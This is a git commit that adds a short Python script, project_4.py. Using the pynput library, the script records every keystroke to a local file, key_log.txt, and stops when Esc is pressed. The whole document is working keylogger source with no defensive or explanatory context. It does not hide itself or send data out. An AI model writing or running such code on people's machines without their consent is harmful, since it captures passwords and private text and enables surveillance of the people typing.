3ffa5b179b3512bf91bbf495936472810991ea58
Shreeya Bhagwat <103103278+shell284u@users.noreply.github.com>
2024-08-07 16:27:26 +0530

    Add files via upload

---
+++ project_4.py
@@ -0,0 +1,25 @@
+from pynput import keyboard
+
+# The file where we will log the keystrokes
+log_file = "key_log.txt"
+
+def on_press(key):
+    try:
+        with open(log_file, "a") as f:
+            f.write(f"{key.char}")
+    except AttributeError:
+        with open(log_file, "a") as f:
+            if key == keyboard.Key.space:
+                f.write(" ")
+            elif key == keyboard.Key.enter:
+                f.write("\n")
+            else:
+                f.write(f"[{key}]")
+
+def on_release(key):
+    if key == keyboard.Key.esc:
+        return False
+
+# Collect events until released
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
